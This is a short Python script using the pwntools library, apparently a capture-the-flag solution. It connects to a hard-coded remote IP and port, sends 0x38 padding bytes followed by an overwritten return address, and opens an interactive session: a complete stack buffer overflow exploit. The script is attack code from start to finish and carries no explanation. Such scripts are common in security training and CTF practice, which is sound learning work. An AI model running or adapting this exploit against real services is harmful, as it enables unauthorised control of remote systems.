from pwn import *

p = remote('114.116.54.89', 10003)

payload = 'a'*0x38 +p64(0x400751)

p.recvline()
p.sendline(payload)

p.interactive()